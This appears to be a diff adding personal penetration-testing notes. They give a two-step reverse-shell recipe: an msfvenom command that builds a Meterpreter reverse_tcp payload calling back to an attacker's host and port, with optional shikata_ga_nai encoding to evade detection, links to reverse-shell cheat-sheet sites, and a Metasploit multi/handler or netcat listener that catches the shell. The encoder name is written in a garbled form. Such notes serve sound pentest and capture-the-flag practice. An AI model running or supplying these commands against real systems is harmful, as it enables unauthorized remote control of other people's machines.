@@ -1,0 +1,34 @@
+
+
+#################################################################################################################
+
+	1) GENERATE PAYLOAD
+
+	MSFVENOM:
+	msfvenom -p <system>/<arch>/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <type> 
+			Options:
+	-e shikata/x86_ga_nai -i 5 <— Encoding (optional)
+
+	REVERSE SHELL:
+	https://www.revshells.com/
+	
+	PENTEST MONKEY:
+	https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+#################################################################################################################
+
+	2) LISTENER
+
+	msfconsole -q
+	use multi/handler
+	set payload <payload>
+	set lport <port>
+	set lhost <ip> 
+	run
+	
+		OR
+	
+	nc -nlvp <port>
+
+#################################################################################################################
+
